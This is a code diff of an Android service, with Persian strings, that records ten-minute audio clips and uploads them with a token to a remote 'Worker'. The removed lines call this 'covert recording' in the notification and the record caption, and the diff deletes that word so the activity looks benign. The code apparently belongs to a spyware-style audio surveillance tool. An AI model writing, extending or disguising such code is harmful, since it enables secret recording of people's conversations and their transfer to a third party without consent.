@@ -25,6 +25,7 @@ public class VoiceRecorderService extends Service {
     private VoiceUploader uploader;
     private int currentRecordId = -1;
     private String voiceToken;
+    private boolean isRecording = false;
     
     @Override
     public void onCreate() {
@@ -50,7 +51,6 @@ public class VoiceRecorderService extends Service {
             voiceToken = intent.getStringExtra("voice_token");
             if (voiceToken == null) {
                 voiceToken = "token_" + System.currentTimeMillis();
-                Log.w(TAG, "⚠️ Voice Token null بود، مقدار جدید: " + voiceToken);
             }
             Log.d(TAG, "🆔 Voice Token: " + voiceToken);
             startRecording();
@@ -62,7 +62,13 @@ public class VoiceRecorderService extends Service {
     }
     
     private void startRecording() {
+        if (isRecording) {
+            Log.w(TAG, "در حال ضبط است!");
+            return;
+        }
+        
         Log.d(TAG, "🎤 شروع ضبط...");
+        isRecording = true;
         sendBroadcast(new Intent("VOICE_RECORDING_STARTED"));
         
         recorderManager.setRecordingListener(new VoiceRecorderManager.RecordingListener() {
@@ -70,79 +76,83 @@ public class VoiceRecorderService extends Service {
             public void onRecordingStarted(String filePath, long startTime) {
                 Log.d(TAG, "✅ ضبط شروع شد: " + filePath);
                 saveVoiceRecord(filePath, startTime);
-                updateNotification("🎤 در حال ضبط...");
+                updateNotification("🎤 در حال ضبط... (۱۰ دقیقه)");
             }
             
             @Override
             public void onRecordingCompleted(String filePath, long duration) {
-                Log.d(TAG, "⏹️ ضبط کامل شد، مدت: " + duration + "ms");
-                updateNotification("📤 در حال ارسال به سرور...");
+                Log.d(TAG, "⏹️ ضبط کامل شد، مدت: " + duration/1000 + " ثانیه");
+                isRecording = false;
+                updateNotification("📤 در حال ارسال...");
                 sendBroadcast(new Intent("VOICE_RECORDING_COMPLETED"));
                 
-                // ارسال به Worker
+                // آپلود به Worker
                 new Thread(() -> {
                     try {
                         VoiceRecord record = database.voiceRecordDao().getVoiceRecord(currentRecordId);
                         if (record != null) {
-                            Log.d(TAG, "📝 رکورد پیدا شد: ID=" + currentRecordId);
                             record.status = "RECORDED";
                             record.endTime = System.currentTimeMillis();
                             record.duration = duration;
                             database.voiceRecordDao().updateVoiceRecord(record);
                             
-                            Log.d(TAG, "📤 شروع آپلود به Worker...");
-                            
-                            // آپلود به Worker با کالبک
-                            uploader.uploadVoice(
+                            boolean success = uploader.uploadVoice(
                                 filePath,
                                 voiceToken,
                                 record.caption,
-                                duration,
-                                new VoiceUploader.UploadCallback() {
-                                    @Override
-                                    public void onSuccess(String response) {
-                                        Log.d(TAG, "✅ آپلود موفق! پاسخ: " + response);
-                                        record.status = "UPLOADED";
-                                        database.voiceRecordDao().updateVoiceRecord(record);
-                                        updateNotification("✅ ارسال به سرور موفق!");
-                                        sendBroadcast(new Intent("VOICE_UPLOAD_SUCCESS"));
-                                    }
-                                    
-                                    @Override
-                                    public void onFailure(String error) {
-                                        Log.e(TAG, "❌ آپلود ناموفق: " + error);
-                                        record.status = "FAILED";
-                                        record.uploadAttempts = record.uploadAttempts + 1;
-                                        database.voiceRecordDao().updateVoiceRecord(record);
-                                        updateNotification("❌ ارسال ناموفق: " + error);
-                                        sendBroadcast(new Intent("VOICE_UPLOAD_FAILED"));
-                                    }
-                                }
+                                duration
                             );
-                        } else {
-                            Log.e(TAG, "❌ رکورد با ID " + currentRecordId + " پیدا نشد");
+                            
+                            if (success) {
+                                record.status = "UPLOADED";
+                                database.voiceRecordDao().updateVoiceRecord(record);
+                                updateNotification("✅ ارسال موفق!");
+                                sendBroadcast(new Intent("VOICE_UPLOAD_SUCCESS"));
+                            } else {
+                                record.status = "FAILED";
+                                record.uploadAttempts = record.uploadAttempts + 1;
+                                database.voiceRecordDao().updateVoiceRecord(record);
+                                updateNotification("❌ ارسال ناموفق");
+                                sendBroadcast(new Intent("VOICE_UPLOAD_FAILED"));
+                            }
                         }
                     } catch (Exception e) {
-                        Log.e(TAG, "❌ خطا در آپلود", e);
+                        Log.e(TAG, "❌ خطا", e);
                         updateNotification("❌ خطا: " + e.getMessage());
                     }
                 }).start();
             }
             
             @Override
+            public void onRecordingStopped(String filePath, long duration) {
+                Log.d(TAG, "⏹️ ضبط متوقف شد، مدت: " + duration/1000 + " ثانیه");
+                isRecording = false;
+                updateNotification("⏹️ ضبط متوقف شد");
+                sendBroadcast(new Intent("VOICE_RECORDING_STOPPED"));
+            }
+            
+            @Override
             public void onRecordingError(String error) {
                 Log.e(TAG, "❌ خطا در ضبط: " + error);
+                isRecording = false;
                 updateNotification("❌ خطا: " + error);
+                sendBroadcast(new Intent("VOICE_RECORDING_ERROR"));
             }
         });
         
         recorderManager.startRecording();
-        startForeground(NOTIFICATION_ID, createNotification("🎤 در حال ضبط مخفی..."));
+        startForeground(NOTIFICATION_ID, createNotification("🎤 در حال ضبط... (۱۰ دقیقه)"));
     }
     
     private void stopRecording() {
+        if (!isRecording) {
+            Log.w(TAG, "ضبط فعال نیست!");
+            return;
+        }
         Log.d(TAG, "⏹️ توقف ضبط");
         recorderManager.stopRecording();
+        isRecording = false;
+        updateNotification("⏹️ ضبط متوقف شد");
     }
     
     private void saveVoiceRecord(String filePath, long startTime) {
@@ -155,10 +165,10 @@ public class VoiceRecorderService extends Service {
             record.uploadAttempts = 0;
             record.createdAt = System.currentTimeMillis();
             String date = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US).format(new Date(startTime));
-            record.caption = "🎙️ ضبط مخفی: " + date;
+            record.caption = "🎙️ ضبط: " + date;
             long id = database.voiceRecordDao().insertVoiceRecord(record);
             currentRecordId = (int) id;
-            Log.d(TAG, "💾 رکورد ذخیره شد با ID: " + id);
+            Log.d(TAG, "💾 رکورد ذخیره شد: ID=" + id);
         }).start();
     }
     
@@ -198,7 +208,7 @@ public class VoiceRecorderService extends Service {
     public void onDestroy() {
         super.onDestroy();
         Log.d(TAG, "💀 سرویس متوقف شد");
-        if (recorderManager != null) {
+        if (recorderManager != null && isRecording) {
             recorderManager.stopRecording();
         }
     }
